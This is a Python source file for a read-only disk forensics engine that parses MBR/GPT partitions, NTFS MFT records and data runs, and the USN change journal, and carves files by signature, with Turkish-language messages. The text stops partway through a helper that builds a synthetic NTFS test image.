"""Original Disk, MBR/GPT Partition, NTFS/MFT (Data Runs + Full Paths), $UsnJrnl:$J & Streaming Carving Engine.

Strictly read-only binary parsing implemented with Python standard library only.
"""

import hashlib
import os
import struct
import uuid
from datetime import datetime, timezone
from typing import Any, Callable, Dict, List, Optional, Tuple

EPOCH_AS_FILETIME = 116444736000000000
HUNDREDS_OF_NANOSECONDS = 10000000

MBR_PARTITION_TYPES = {
    0x00: "Empty",
    0x01: "FAT12",
    0x04: "FAT16 (<32MB)",
    0x05: "Extended",
    0x06: "FAT16",
    0x07: "NTFS / exFAT",
    0x0B: "FAT32 (CHS)",
    0x0C: "FAT32 (LBA)",
    0x0E: "FAT16 (LBA)",
    0x0F: "Extended (LBA)",
    0x27: "Windows Recovery (NTFS)",
    0x82: "Linux Swap",
    0x83: "Linux Native",
    0xEE: "GPT Protective MBR",
    0xEF: "EFI System Partition",
}

USN_REASONS = {
    0x00000001: "DATA_OVERWRITE",
    0x00000002: "DATA_EXTEND",
    0x00000004: "DATA_TRUNCATION",
    0x00000010: "NAMED_DATA_OVERWRITE",
    0x00000020: "NAMED_DATA_EXTEND",
    0x00000100: "FILE_CREATE",
    0x00000200: "FILE_DELETE",
    0x00000400: "EA_CHANGE",
    0x00000800: "SECURITY_CHANGE",
    0x00001000: "RENAME_OLD_NAME",
    0x00002000: "RENAME_NEW_NAME",
    0x00004000: "INDEXABLE_CHANGE",
    0x00008000: "BASIC_INFO_CHANGE",
    0x00010000: "HARD_LINK_CHANGE",
    0x00020000: "COMPRESSION_CHANGE",
    0x00040000: "ENCRYPTION_CHANGE",
    0x00080000: "OBJECT_ID_CHANGE",
    0x00100000: "REPARSE_POINT_CHANGE",
    0x00200000: "STREAM_CHANGE",
    0x80000000: "CLOSE",
}

FILE_SIGNATURES: List[Tuple[bytes, int, str, str, str]] = [
    (b"\xFF\xD8\xFF", 0, "JPEG", "image/jpeg", "Yüksek"),
    (b"\x89PNG\r\n\x1a\n", 0, "PNG", "image/png", "Yüksek"),
    (b"%PDF-", 0, "PDF", "application/pdf", "Yüksek"),
    (b"PK\x03\x04", 0, "ZIP / DOCX / XLSX", "application/zip", "Yüksek"),
    (b"SQLite format 3\x00", 0, "SQLite 3 Veritabanı", "application/x-sqlite3", "Yüksek"),
    (b"MZ", 0, "PE Executable (EXE/DLL)", "application/x-dosexec", "Orta"),
    (b"ElfFile\x00", 0, "Windows Event Log (EVTX)", "application/x-evtx", "Yüksek"),
    (b"regf", 0, "Windows Registry Hive", "application/x-winreg", "Yüksek"),
    (b"EVF\x09\x0d\x0a\xff\x00", 0, "EnCase E01 Image", "application/x-ewf", "Yüksek"),
    (b"\x4c\x00\x00\x00\x01\x14\x02\x00", 0, "Windows LNK Shortcut", "application/x-ms-shortcut", "Yüksek"),
    (b"SCCA", 4, "Windows Prefetch", "application/x-prefetch", "Yüksek"),
]


def filetime_to_datetime(ft: int) -> Optional[datetime]:
    """Convert 64-bit Windows FILETIME to UTC datetime; returns None if invalid/missing."""
    if ft <= EPOCH_AS_FILETIME or ft > 2650467743999999999:
        return None
    try:
        unix_ts = (ft - EPOCH_AS_FILETIME) / HUNDREDS_OF_NANOSECONDS
        return datetime.fromtimestamp(unix_ts, tz=timezone.utc).replace(tzinfo=None)
    except Exception:
        return None


def datetime_to_filetime(dt: datetime) -> int:
    """Convert naive/UTC datetime to 64-bit Windows FILETIME."""
    ts = dt.replace(tzinfo=timezone.utc).timestamp()
    return int(ts * HUNDREDS_OF_NANOSECONDS) + EPOCH_AS_FILETIME


def detect_signature(data: bytes) -> Tuple[str, str]:
    """Identify file type from magic bytes without trusting extension."""
    for sig, offset, label, _, confidence in FILE_SIGNATURES:
        if len(data) >= offset + len(sig) and data[offset:offset + len(sig)] == sig:
            return label, confidence
    if data and all(32 <= b < 127 or b in (9, 10, 13) for b in data[:64]):
        return "Düz Metin / Script", "Orta"
    return "Bilinmeyen / Ham Veri", "Düşük"


def decode_data_runs(runlist: bytes) -> List[Tuple[Optional[int], int]]:
    """Decode NTFS non-resident mapping-pair data runs into [(absolute_lcn_or_None, cluster_count)]."""
    runs: List[Tuple[Optional[int], int]] = []
    pos = 0
    prev_lcn = 0
    while pos < len(runlist):
        header = runlist[pos]
        pos += 1
        if header == 0:
            break
        len_bytes = header & 0x0F
        off_bytes = (header >> 4) & 0x0F
        if len_bytes == 0 or pos + len_bytes + off_bytes > len(runlist):
            break
        cluster_count = int.from_bytes(runlist[pos:pos + len_bytes], "little", signed=False)
        pos += len_bytes
        if off_bytes == 0:
            # Sparse run (no allocated clusters on disk)
            runs.append((None, cluster_count))
        else:
            rel_lcn = int.from_bytes(runlist[pos:pos + off_bytes], "little", signed=True)
            pos += off_bytes
            prev_lcn += rel_lcn
            if prev_lcn < 0:
                break
            runs.append((prev_lcn, cluster_count))
    return runs


def decode_usn_reasons(reason_mask: int) -> List[str]:
    """Decode USN_RECORD reason bitmask into ordered forensic action labels."""
    return [name for bit, name in USN_REASONS.items() if reason_mask & bit]


class DiskForensicsEngine:
    """Original binary forensic engine for RAW/E01, MBR/GPT, NTFS/MFT Data Runs, $UsnJrnl & Streaming Carving."""

    PARSER_NAME = "AdliBilisim-Original-NTFS-Engine"
    PARSER_VERSION = "2.0.0"

    def inspect_image(self, image_path: str, max_mft_records: int = 32768) -> Dict[str, Any]:
        """Inspect a disk image (RAW, E01 via EwfImageStream, Volume, or $MFT) in strict read-only mode."""
        if not os.path.isfile(image_path):
            raise FileNotFoundError(f"İmaj dosyası bulunamadı: {image_path}")

        with open(image_path, "rb") as f:
            head = f.read(min(os.path.getsize(image_path), 1024 * 64))

        # Check EnCase E01 signature -> open via pure-Python EwfImageStream if available
        if head.startswith(b"EVF\x09\x0d\x0a\xff\x00"):
            try:
                from src.ntfs_engine.ewf_reader import EwfImageStream
                ewf = EwfImageStream(image_path)
                return self._inspect_stream(
                    ewf,
                    image_path=image_path,
                    image_size=ewf.total_size,
                    fmt_label="E01 (EnCase EWF - Çözümlendi)",
                    max_mft_records=max_mft_records,
                )
            except Exception as e:
                return {
                    "image_path": image_path,
                    "image_name": os.path.basename(image_path),
                    "image_size": os.path.getsize(image_path),
                    "format": "E01 (EnCase EWF)",
                    "partitions": [],
                    "mft_records": [],
                    "warnings": [f"E01 konteyner başlığı tespit edildi ancak segment açma başarısız oldu: {e}"],
                    "header_bytes": head[:4096],
                }

        size = os.path.getsize(image_path)
        with open(image_path, "rb") as f:
            return self._inspect_stream(f, image_path=image_path, image_size=size, fmt_label=None, max_mft_records=max_mft_records)

    def _inspect_stream(
        self,
        stream,
        image_path: str,
        image_size: int,
        fmt_label: Optional[str],
        max_mft_records: int = 32768,
    ) -> Dict[str, Any]:
        warnings: List[str] = []
        stream.seek(0)
        head = stream.read(min(image_size, 65536))

        # Standalone $MFT file
        if head[:4] == b"FILE" and image_size >= 1024:
            records = self._parse_mft_stream(stream, 0, image_size, max_records=max_mft_records)
            self._resolve_full_paths(records)
            return {
                "image_path": image_path,
                "image_name": os.path.basename(image_path),
                "image_size": image_size,
                "format": "Standalone $MFT",
                "partitions": [{
                    "index": 1,
                    "scheme": "MFT",
                    "type_name": "Standalone $MFT Record Table",
                    "bootable": False,
                    "start_lba": 0,
                    "start_offset": 0,
                    "sector_count": image_size // 512,
                    "size_bytes": image_size,
                    "filesystem": "NTFS MFT",
                    "vbr_info": {},
                }],
                "mft_records": records,
                "warnings": warnings,
                "header_bytes": head[:4096],
            }

        # Direct NTFS Volume without MBR
        if len(head) >= 512 and head[3:11] == b"NTFS    ":
            vbr = self.parse_ntfs_vbr(head[:512], base_offset=0)
            mft_records = self._extract_mft_from_stream(stream, image_size, 0, vbr, warnings, max_records=max_mft_records)
            self._resolve_full_paths(mft_records)
            return {
                "image_path": image_path,
                "image_name": os.path.basename(image_path),
                "image_size": image_size,
                "format": fmt_label or "RAW Volume (NTFS)",
                "partitions": [{
                    "index": 1,
                    "scheme": "VBR",
                    "type_name": "NTFS Volume",
                    "bootable": True,
                    "start_lba": 0,
                    "start_offset": 0,
                    "sector_count": vbr.get("total_sectors", image_size // 512),
                    "size_bytes": image_size,
                    "filesystem": "NTFS",
                    "vbr_info": vbr,
                }],
                "mft_records": mft_records,
                "warnings": warnings,
                "header_bytes": head[:4096],
            }

        partitions = self._parse_partition_table_from_stream(stream, image_size, warnings)
        all_mft_records: List[Dict[str, Any]] = []

        for part in partitions:
            offset = part["start_offset"]
            if offset + 512 <= image_size:
                stream.seek(offset)
                vbr_raw = stream.read(512)
                if vbr_raw[3:11] == b"NTFS    ":
                    vbr = self.parse_ntfs_vbr(vbr_raw, base_offset=offset)
                    part["filesystem"] = "NTFS"
                    part["vbr_info"] = vbr
                    recs = self._extract_mft_from_stream(
                        stream, image_size, offset, vbr, warnings,
                        partition_idx=part["index"], max_records=max_mft_records,
                    )
                    self._resolve_full_paths(recs)
                    all_mft_records.extend(recs)
                elif vbr_raw[54:62] in (b"FAT16   ", b"FAT12   ") or vbr_raw[82:90] == b"FAT32   ":
                    part["filesystem"] = "FAT"
                    part["vbr_info"] = {"oem": vbr_raw[3:11].decode("ascii", "replace").strip()}
                else:
                    part["filesystem"] = part.get("type_name", "Bilinmeyen")
                    part["vbr_info"] = {}

        if not partitions:
            warnings.append("Geçerli MBR (0x55AA) veya GPT ('EFI PART') bölüm tablosu bulunamadı.")

        return {
            "image_path": image_path,
            "image_name": os.path.basename(image_path),
            "image_size": image_size,
            "format": fmt_label or "RAW Disk Image (.dd/.raw)",
            "partitions": partitions,
            "mft_records": all_mft_records,
            "warnings": warnings,
            "header_bytes": head[:4096],
        }

    def parse_partition_table(self, image_path: str, warnings: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        """Parse MBR and GPT partition entries from sector 0 / LBA 1."""
        if warnings is None:
            warnings = []
        size = os.path.getsize(image_path)
        with open(image_path, "rb") as f:
            return self._parse_partition_table_from_stream(f, size, warnings)

    def _parse_partition_table_from_stream(self, stream, size: int, warnings: List[str]) -> List[Dict[str, Any]]:
        partitions: List[Dict[str, Any]] = []
        if size < 512:
            warnings.append("Dosya 512 bayttan küçük olduğu için sektör analizi yapılamadı.")
            return partitions

        stream.seek(0)
        mbr = stream.read(512)
        if len(mbr) < 512:
            return partitions
        sig = struct.unpack("<H", mbr[510:512])[0]
        if sig != 0xAA55:
            return partitions

        has_gpt = False
        for idx in range(4):
            entry = mbr[446 + idx * 16:446 + (idx + 1) * 16]
            boot_flag, p_type = entry[0], entry[4]
            start_lba, sector_count = struct.unpack("<II", entry[8:16])
            if p_type == 0 or sector_count == 0:
                continue
            if p_type == 0xEE:
                has_gpt = True
                continue
            partitions.append({
                "index": len(partitions) + 1,
                "scheme": "MBR",
                "type_code": f"0x{p_type:02X}",
                "type_name": MBR_PARTITION_TYPES.get(p_type, f"Tip 0x{p_type:02X}"),
                "bootable": boot_flag == 0x80,
                "start_lba": start_lba,
                "start_offset": start_lba * 512,
                "sector_count": sector_count,
                "size_bytes": sector_count * 512,
                "filesystem": "Bilinmiyor",
                "vbr_info": {},
            })

        if has_gpt or size >= 1024:
            stream.seek(512)
            gpt_hdr = stream.read(92)
            if len(gpt_hdr) >= 92 and gpt_hdr[:8] == b"EFI PART":
                part_entries_lba = struct.unpack("<Q", gpt_hdr[72:80])[0]
                num_entries, entry_size = struct.unpack("<II", gpt_hdr[80:88])
                entries_offset = part_entries_lba * 512
                max_read = min(num_entries, 128)
                if entries_offset + max_read * entry_size <= size and entry_size >= 128:
                    stream.seek(entries_offset)
                    raw_entries = stream.read(max_read * entry_size)
                    for idx in range(max_read):
                        ent = raw_entries[idx * entry_size:(idx + 1) * entry_size]
                        type_guid_bytes = ent[0:16]
                        if type_guid_bytes == b"\x00" * 16:
                            continue
                        type_guid = str(uuid.UUID(bytes_le=type_guid_bytes))
                        first_lba, last_lba = struct.unpack("<QQ", ent[32:48])
                        part_name = ent[56:128].decode("utf-16le", errors="ignore").rstrip("\x00")
                        sectors = max(0, last_lba - first_lba + 1)
                        partitions.append({
                            "index": len(partitions) + 1,
                            "scheme": "GPT",
                            "type_code": type_guid[:8],
                            "type_name": part_name or f"GPT ({type_guid[:8]})",
                            "bootable": False,
                            "start_lba": first_lba,
                            "start_offset": first_lba * 512,
                            "sector_count": sectors,
                            "size_bytes": sectors * 512,
                            "filesystem": "Bilinmiyor",
                            "vbr_info": {"type_guid": type_guid},
                        })
        return partitions

    def parse_ntfs_vbr(self, vbr: bytes, base_offset: int = 0) -> Dict[str, Any]:
        """Parse 512-byte NTFS Volume Boot Record ($Boot)."""
        bytes_per_sector = struct.unpack("<H", vbr[11:13])[0] or 512
        sectors_per_cluster = vbr[13] or 8
        total_sectors = struct.unpack("<Q", vbr[40:48])[0]
        mft_cluster = struct.unpack("<Q", vbr[48:56])[0]
        mft_mirr_cluster = struct.unpack("<Q", vbr[56:64])[0]
        raw_mft_rec_size = struct.unpack("<b", vbr[64:65])[0]
        if raw_mft_rec_size < 0:
            mft_record_size = 1 << abs(raw_mft_rec_size)
        else:
            mft_record_size = raw_mft_rec_size * bytes_per_sector * sectors_per_cluster
        if mft_record_size <= 0:
            mft_record_size = 1024
        vol_serial = struct.unpack("<Q", vbr[72:80])[0]
        bytes_per_cluster = bytes_per_sector * sectors_per_cluster
        return {
            "oem_id": vbr[3:11].decode("ascii", "replace").strip(),
            "bytes_per_sector": bytes_per_sector,
            "sectors_per_cluster": sectors_per_cluster,
            "bytes_per_cluster": bytes_per_cluster,
            "total_sectors": total_sectors,
            "mft_cluster": mft_cluster,
            "mft_mirr_cluster": mft_mirr_cluster,
            "mft_offset": base_offset + (mft_cluster * bytes_per_cluster),
            "mft_record_size": mft_record_size,
            "volume_serial": f"{vol_serial:016X}",
        }

    def _extract_mft_from_stream(
        self,
        stream,
        img_size: int,
        part_offset: int,
        vbr: Dict[str, Any],
        warnings: List[str],
        partition_idx: int = 1,
        max_records: int = 32768,
    ) -> List[Dict[str, Any]]:
        mft_offset = vbr["mft_offset"]
        rec_size = vbr["mft_record_size"]
        bpc = vbr["bytes_per_cluster"]
        if mft_offset >= img_size:
            warnings.append(f"Bölüm {partition_idx}: $MFT başlangıç adresi (0x{mft_offset:X}) imaj boyutu dışında.")
            return []

        # Read Record 0 ($MFT) to see if $MFT itself has fragmented non-resident data runs
        stream.seek(mft_offset)
        rec0_raw = stream.read(rec_size)
        if len(rec0_raw) < rec_size or rec0_raw[:4] not in (b"FILE", b"BAAD"):
            return []

        rec0 = self.parse_mft_record(rec0_raw, record_index=0, image_offset=mft_offset)
        mft_runs = rec0.get("data_runs", [])

        records: List[Dict[str, Any]] = []
        if mft_runs:
            # Stream across EVERY non-resident extent of $MFT!
            rec_idx = 0
            for lcn, cluster_cnt in mft_runs:
                if rec_idx >= max_records:
                    break
                if lcn is None:
                    rec_idx += (cluster_cnt * bpc) // rec_size
                    continue
                run_off = part_offset + lcn * bpc
                run_bytes = cluster_cnt * bpc
                if run_off >= img_size:
                    continue
                stream.seek(run_off)
                to_read = min(run_bytes, img_size - run_off)
                consumed = 0
                while consumed + rec_size <= to_read and rec_idx < max_records:
                    raw = stream.read(rec_size)
                    if len(raw) < rec_size:
                        break
                    if raw[:4] in (b"FILE", b"BAAD"):
                        parsed = self.parse_mft_record(raw, record_index=rec_idx, image_offset=run_off + consumed)
                        parsed["partition_index"] = partition_idx
                        self._attach_non_resident_preview(stream, img_size, part_offset, bpc, parsed)
                        records.append(parsed)
                    rec_idx += 1
                    consumed += rec_size
            return records

        # Fallback: contiguous MFT read (used for compact synthetic images where $MFT Record 0 has no runlist)
        records = self._parse_mft_stream(
            stream, mft_offset, img_size, rec_size=rec_size,
            partition_idx=partition_idx, max_records=max_records,
            part_offset=part_offset, bytes_per_cluster=bpc,
        )
        return records

    def _parse_mft_stream(
        self,
        stream,
        start_offset: int,
        total_size: int,
        rec_size: int = 1024,
        partition_idx: int = 1,
        max_records: int = 32768,
        part_offset: int = 0,
        bytes_per_cluster: int = 4096,
    ) -> List[Dict[str, Any]]:
        records: List[Dict[str, Any]] = []
        stream.seek(start_offset)
        for idx in range(max_records):
            if start_offset + (idx + 1) * rec_size > total_size:
                break
            raw = stream.read(rec_size)
            if len(raw) < rec_size:
                break
            if raw[:4] == b"\x00\x00\x00\x00":
                continue
            if raw[:4] in (b"FILE", b"BAAD"):
                parsed = self.parse_mft_record(raw, record_index=idx, image_offset=start_offset + idx * rec_size)
                parsed["partition_index"] = partition_idx
                self._attach_non_resident_preview(stream, total_size, part_offset, bytes_per_cluster, parsed)
                records.append(parsed)
            elif idx > 16:
                break
        return records

    def _attach_non_resident_preview(self, stream, img_size: int, part_offset: int, bpc: int, parsed: Dict[str, Any]):
        """Read first up to 4096 bytes of a non-resident $DATA file for signature & hex inspection."""
        if parsed.get("is_resident") or parsed.get("is_dir") or parsed.get("record_index") == 0:
            return
        runs = parsed.get("data_runs") or []
        if not runs:
            return
        cur_pos = stream.tell()
        preview = bytearray()
        try:
            for lcn, cnt in runs:
                if lcn is None or cnt <= 0:
                    continue
                off = part_offset + lcn * bpc
                if off >= img_size:
                    continue
                need = min(4096 - len(preview), cnt * bpc, img_size - off)
                if need <= 0:
                    break
                stream.seek(off)
                preview.extend(stream.read(need))
                if len(preview) >= 4096:
                    break
            if preview:
                data_b = bytes(preview[: min(len(preview), parsed.get("size") or len(preview))])
                parsed["resident_data"] = data_b
                sig_label, sig_conf = detect_signature(data_b)
                parsed["signature_type"] = sig_label
                parsed["signature_confidence"] = sig_conf
                parsed["sha256"] = hashlib.sha256(data_b).hexdigest() + " (İlk 4KB)"
        finally:
            stream.seek(cur_pos)

    def _resolve_full_paths(self, records: List[Dict[str, Any]]) -> None:
        """Reconstruct full NTFS directory paths from parent_mft_ref links."""
        by_idx = {r["record_index"]: r for r in records}
        for r in records:
            parts = [r["filename"]]
            visited = {r["record_index"]}
            cur = r.get("parent_mft_ref")
            depth = 0
            while cur is not None and cur not in visited and depth < 32:
                visited.add(cur)
                parent = by_idx.get(cur)
                if not parent:
                    break
                pname = parent["filename"]
                if pname == "." or cur == 5:
                    break
                parts.append(pname)
                cur = parent.get("parent_mft_ref")
                depth += 1
            r["full_path"] = "\\" + "\\".join(reversed(parts))

    def parse_mft_file(self, mft_path: str, max_records: int = 32768) -> List[Dict[str, Any]]:
        """Parse a standalone $MFT file directly."""
        size = os.path.getsize(mft_path)
        with open(mft_path, "rb") as f:
            records = self._parse_mft_stream(f, 0, size, max_records=max_records)
        self._resolve_full_paths(records)
        return records

    def parse_mft_record(self, raw_record: bytes, record_index: int = 0, image_offset: int = 0) -> Dict[str, Any]:
        """Parse a single 1024-byte NTFS MFT FILE record with USA fixup & non-resident data runs."""
        buf = bytearray(raw_record)
        magic = bytes(buf[:4]).decode("ascii", "replace")
        usa_offset, usa_count = struct.unpack("<HH", buf[4:8])
        first_attr_off = struct.unpack("<H", buf[20:22])[0]
        flags = struct.unpack("<H", buf[22:24])[0]
        in_use = bool(flags & 0x0001)
        is_dir = bool(flags & 0x0002)

        fixup_ok = True
        if usa_offset > 0 and usa_count > 1 and usa_offset + usa_count * 2 <= len(buf):
            usn = buf[usa_offset:usa_offset + 2]
            for sec_i in range(1, usa_count):
                sec_end = sec_i * 512 - 2
                if sec_end + 2 <= len(buf):
                    if buf[sec_end:sec_end + 2] != usn:
                        fixup_ok = False
                    rep = buf[usa_offset + sec_i * 2:usa_offset + (sec_i + 1) * 2]
                    buf[sec_end:sec_end + 2] = rep

        created = modified = mft_modified = accessed = None
        best_filename = ""
        parent_mft_ref: Optional[int] = None
        real_size = 0
        resident_data = b""
        is_resident = False
        data_runs: List[Tuple[Optional[int], int]] = []
        attr_list: List[str] = []

        off = first_attr_off
        while 0 < off < len(buf) - 8:
            attr_type = struct.unpack("<I", buf[off:off + 4])[0]
            if attr_type == 0xFFFFFFFF:
                break
            attr_len = struct.unpack("<I", buf[off + 4:off + 8])[0]
            if attr_len < 16 or off + attr_len > len(buf):
                break
            non_resident = buf[off + 8]
            attr_name_len = buf[off + 9]

            if attr_type == 0x10 and non_resident == 0:
                attr_list.append("$STANDARD_INFORMATION")
                c_off = struct.unpack("<H", buf[off + 20:off + 22])[0]
                if off + c_off + 32 <= len(buf):
                    c_ft, m_ft, mm_ft, a_ft = struct.unpack("<QQQQ", buf[off + c_off:off + c_off + 32])
                    created = filetime_to_datetime(c_ft)
                    modified = filetime_to_datetime(m_ft)
                    mft_modified = filetime_to_datetime(mm_ft)
                    accessed = filetime_to_datetime(a_ft)

            elif attr_type == 0x30 and non_resident == 0:
                attr_list.append("$FILE_NAME")
                c_off = struct.unpack("<H", buf[off + 20:off + 22])[0]
                fn_base = off + c_off
                if fn_base + 66 <= len(buf):
                    p_ref = struct.unpack("<Q", buf[fn_base:fn_base + 8])[0] & 0x0000FFFFFFFFFFFF
                    fn_real_size = struct.unpack("<Q", buf[fn_base + 48:fn_base + 56])[0]
                    name_len = buf[fn_base + 64]
                    namespace = buf[fn_base + 65]
                    name_end = fn_base + 66 + name_len * 2
                    if name_end <= len(buf):
                        name = bytes(buf[fn_base + 66:name_end]).decode("utf-16le", errors="replace")
                        if not best_filename or namespace != 2:
                            best_filename = name
                            parent_mft_ref = p_ref
                            if real_size == 0 and fn_real_size > 0:
                                real_size = fn_real_size

            elif attr_type == 0x80 and attr_name_len == 0:
                attr_list.append("$DATA")
                if non_resident == 0:
                    is_resident = True
                    c_len = struct.unpack("<I", buf[off + 16:off + 20])[0]
                    c_off = struct.unpack("<H", buf[off + 20:off + 22])[0]
                    if off + c_off + c_len <= len(buf):
                        resident_data = bytes(buf[off + c_off:off + c_off + c_len])
                        real_size = c_len
                else:
                    if off + 56 <= len(buf):
                        real_size = struct.unpack("<Q", buf[off + 48:off + 56])[0]
                        run_off = struct.unpack("<H", buf[off + 32:off + 34])[0]
                        if run_off >= 64 and off + run_off < off + attr_len:
                            data_runs = decode_data_runs(bytes(buf[off + run_off:off + attr_len]))

            off += attr_len

        sig_label, sig_conf = ("Dizin", "Yüksek") if is_dir else detect_signature(resident_data)
        return {
            "record_index": record_index,
            "image_offset": image_offset,
            "magic": magic,
            "fixup_ok": fixup_ok,
            "in_use": in_use,
            "is_deleted": not in_use,
            "is_dir": is_dir,
            "filename": best_filename or f"<Adsız Kayıt #{record_index}>",
            "full_path": best_filename or f"<Adsız Kayıt #{record_index}>",
            "parent_mft_ref": parent_mft_ref,
            "size": real_size,
            "is_resident": is_resident,
            "data_runs": data_runs,
            "resident_data": resident_data,
            "sha256": hashlib.sha256(resident_data).hexdigest() if resident_data else "-",
            "signature_type": sig_label,
            "signature_confidence": sig_conf,
            "created": created,
            "modified": modified,
            "mft_modified": mft_modified,
            "accessed": accessed,
            "attributes": attr_list,
            "raw_bytes": bytes(raw_record),
        }

    def parse_usn_journal(self, usn_path: str, max_records: int = 10000) -> List[Dict[str, Any]]:
        """Parse NTFS $UsnJrnl:$J binary change journal (USN_RECORD_V2 & V3), skipping leading sparse zeros."""
        if not os.path.isfile(usn_path):
            raise FileNotFoundError(f"$UsnJrnl:$J dosyası bulunamadı: {usn_path}")

        records: List[Dict[str, Any]] = []
        file_size = os.path.getsize(usn_path)
        chunk_size = 1024 * 1024
        pos = 0

        with open(usn_path, "rb") as f:
            while pos < file_size and len(records) < max_records:
                f.seek(pos)
                buf = f.read(chunk_size)
                if not buf:
                    break
                # Skip zero-filled sparse blocks quickly
                if buf == b"\x00" * len(buf):
                    pos += len(buf)
                    continue

                inner = 0
                # Advance past leading zero padding
                while inner + 8 <= len(buf) and buf[inner:inner + 4] == b"\x00\x00\x00\x00":
                    inner += 8

                progressed = False
                while inner + 60 <= len(buf) and len(records) < max_records:
                    rec_len = struct.unpack("<I", buf[inner:inner + 4])[0]
                    if rec_len == 0:
                        inner += 8
                        continue
                    if rec_len < 60 or rec_len > 4096:
                        break
                    if inner + rec_len > len(buf):
                        break

                    major, minor = struct.unpack("<HH", buf[inner + 4:inner + 8])
                    if major == 2 and inner + 60 <= len(buf):
                        file_ref = struct.unpack("<Q", buf[inner + 8:inner + 16])[0] & 0x0000FFFFFFFFFFFF
                        parent_ref = struct.unpack("<Q", buf[inner + 16:inner + 24])[0] & 0x0000FFFFFFFFFFFF
                        usn = struct.unpack("<Q", buf[inner + 24:inner + 32])[0]
                        ts = filetime_to_datetime(struct.unpack("<Q", buf[inner + 32:inner + 40])[0])
                        reason_mask = struct.unpack("<I", buf[inner + 40:inner + 44])[0]
                        fname_len, fname_off = struct.unpack("<HH", buf[inner + 56:inner + 60])
                        if inner + fname_off + fname_len <= inner + rec_len:
                            fname = buf[inner + fname_off:inner + fname_off + fname_len].decode("utf-16le", errors="replace")
                        else:
                            fname = "<Eksik>"
                        records.append({
                            "usn": usn,
                            "version": f"v{major}.{minor}",
                            "timestamp_utc": ts,
                            "filename": fname,
                            "mft_ref": file_ref,
                            "parent_mft_ref": parent_ref,
                            "reasons": decode_usn_reasons(reason_mask),
                            "reason_str": " | ".join(decode_usn_reasons(reason_mask)) or f"0x{reason_mask:08X}",
                            "offset": pos + inner,
                        })
                        progressed = True
                    elif major == 3 and inner + 76 <= len(buf):
                        file_ref = struct.unpack("<Q", buf[inner + 8:inner + 16])[0] & 0x0000FFFFFFFFFFFF
                        parent_ref = struct.unpack("<Q", buf[inner + 24:inner + 32])[0] & 0x0000FFFFFFFFFFFF
                        usn = struct.unpack("<Q", buf[inner + 40:inner + 48])[0]
                        ts = filetime_to_datetime(struct.unpack("<Q", buf[inner + 48:inner + 56])[0])
                        reason_mask = struct.unpack("<I", buf[inner + 56:inner + 60])[0]
                        fname_len, fname_off = struct.unpack("<HH", buf[inner + 72:inner + 76])
                        if inner + fname_off + fname_len <= inner + rec_len:
                            fname = buf[inner + fname_off:inner + fname_off + fname_len].decode("utf-16le", errors="replace")
                        else:
                            fname = "<Eksik>"
                        records.append({
                            "usn": usn,
                            "version": f"v{major}.{minor}",
                            "timestamp_utc": ts,
                            "filename": fname,
                            "mft_ref": file_ref,
                            "parent_mft_ref": parent_ref,
                            "reasons": decode_usn_reasons(reason_mask),
                            "reason_str": " | ".join(decode_usn_reasons(reason_mask)) or f"0x{reason_mask:08X}",
                            "offset": pos + inner,
                        })
                        progressed = True
                    else:
                        break

                    inner += rec_len

                pos += inner if progressed and inner > 0 else len(buf)

        return records

    def carve_signatures_streaming(
        self,
        image_path: str,
        chunk_size: int = 1024 * 1024,
        max_carved: int = 1000,
        progress_callback: Optional[Callable[[int], None]] = None,
        cancel_check: Optional[Callable[[], bool]] = None,
    ) -> List[Dict[str, Any]]:
        """Stream-based constant-RAM File Carving across arbitrarily large disk images."""
        if not os.path.isfile(image_path):
            raise FileNotFoundError(image_path)

        total_size = os.path.getsize(image_path)
        overlap = 64
        carved: List[Dict[str, Any]] = []
        seen_offsets = set()

        with open(image_path, "rb") as f:
            offset = 0
            while offset < total_size and len(carved) < max_carved:
                if cancel_check and cancel_check():
                    break
                f.seek(offset)
                chunk = f.read(chunk_size + overlap)
                if not chunk:
                    break

                scan_limit = min(len(chunk), chunk_size)
                for sig, sig_off, label, mime, confidence in FILE_SIGNATURES:
                    start = 0
                    while len(carved) < max_carved:
                        pos = chunk.find(sig, start)
                        if pos == -1 or pos >= scan_limit:
                            break
                        actual_off = offset + pos - sig_off
                        if actual_off >= 0 and actual_off not in seen_offsets:
                            seen_offsets.add(actual_off)
                            local_start = max(0, pos - sig_off)
                            preview = chunk[local_start:local_start + 512]
                            est_size = len(preview)
                            if label == "JPEG":
                                eoi = chunk.find(b"\xFF\xD9", pos)
                                if eoi != -1 and (eoi - local_start) <= chunk_size:
                                    est_size = (eoi + 2) - local_start
                            elif label == "PDF":
                                eof = chunk.find(b"%%EOF", pos)
                                if eof != -1 and (eof - local_start) <= chunk_size:
                                    est_size = (eof + 5) - local_start

                            carved.append({
                                "offset": actual_off,
                                "offset_hex": f"0x{actual_off:08X}",
                                "type": label,
                                "mime": mime,
                                "estimated_size": est_size,
                                "confidence": confidence,
                                "method": "Streaming Chunk Header/Footer Carving (Salt Okunur)",
                                "sha256_head": hashlib.sha256(chunk[local_start:local_start + est_size]).hexdigest(),
                                "preview_bytes": chunk[local_start:local_start + min(est_size, 4096)],
                            })
                        start = pos + len(sig)

                offset += chunk_size
                if progress_callback and total_size > 0:
                    progress_callback(min(100, int((offset * 100) / total_size)))

        if progress_callback:
            progress_callback(100)
        carved.sort(key=lambda x: x["offset"])
        return carved

    def carve_signatures(self, image_path: str, max_scan_bytes: int = 64 * 1024 * 1024) -> List[Dict[str, Any]]:
        """Backward-compatible carving wrapper backed by streaming engine."""
        return self.carve_signatures_streaming(image_path)


def create_synthetic_ntfs_image(output_path: str) -> str:
    """Create a forensically valid synthetic MBR + NTFS VBR + fragmented $MFT + non-resident file disk image."""
    os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)
    part_start_lba = 128
    part_sectors = 512
    total_size = (part_start_lba + part_sectors) * 512
    img = bytearray(total_size)

    img[446:462] = struct.pack("<B3sB3sII", 0x80, b"\x00\x00\x00", 0x07, b"\x00\x00\x00", part_start_lba, part_sectors)
    img[510:512] = b"\x55\xAA"

    vbr_off = part_start_lba * 512
    img[vbr_off:vbr_off + 3] = b"\xEB\x52\x90"
    img[vbr_off + 3:vbr_off + 11] = b"NTFS    "
    struct.pack_into("<H", img, vbr_off + 11, 512)
    img[vbr_off + 13] = 8  # 4096 bytes per cluster
    struct.pack_into("<Q", img, vbr_off + 40, part_sectors)
    struct.pack_into("<Q", img, vbr_off + 48, 4)   # MFT cluster 4
    struct.pack_into("<Q", img, vbr_off + 56, 8)
    struct.pack_into("<b", img, vbr_off + 64, -10)
    struct.pack_into("<Q", img, vbr_off + 72, 0xA4B2C8D199001122)
